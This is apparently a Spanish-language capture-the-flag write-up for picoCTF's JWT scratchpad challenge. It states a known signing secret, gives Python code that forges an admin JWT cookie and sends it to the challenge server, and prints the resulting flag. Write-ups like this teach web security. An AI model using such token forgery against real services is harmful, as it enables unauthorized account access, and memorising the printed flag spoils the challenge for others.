## Descripción 
Check the admin scratchpad! `https://jupiter.challenges.picoctf.org/problem/63090/` or http://jupiter.challenges.picoctf.org:63090
## Solución
Iniciar sesion con John y ver el token que esta en formato JWT en  las cookies.

"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiSm9obiJ9.K1Omo0Gk5saKwJTkkgT7PUZohD7USknEE0lmT2AYAiM"

	python3 -c "
	import jwt
	secret = 'ilovepico'
	admin_jwt = jwt.encode({'user': 'admin'}, secret, algorithm='HS256')
	print('JWT correcto para admin:', admin_jwt)
	"
Usar este codigo para debuggear el token en consola.

> import jwt
> import requests
> 
> secret = 'ilovepico'
> admin_jwt = jwt.encode({'user': 'admin'}, secret, algorithm='HS256')
> print('JWT para admin:', admin_jwt)
> 
> cookies = {'jwt': admin_jwt}
> response = requests.get('http://jupiter.challenges.picoctf.org:63090/', cookies=cookies)
> 
> print('=== BUSCANDO FLAG ===')
> if 'picoCTF' in response.text:
>     import re
>     flag_match = re.search(r'picoCTF\{[^}]*\}', response.text)
>     if flag_match:
>         print('✅ FLAG ENCONTRADA:', flag_match.group())
>     else:
>         print('picoCTF encontrado pero no en formato esperado')
>         print(response.text)
> else:
>     print('Revisando respuesta...')
>     if 'admin' in response.text.lower():
>         print('Parece que funciona como admin')
>     print('Primeros 1000 caracteres:')
>     print(response.text[:1000])

Con ese codigo obtenemos la flag.
flag = "picoCTF{jawt_was_just_what_you_thought_f859ab2f}"

## Notas Adicionales 
## Referencias
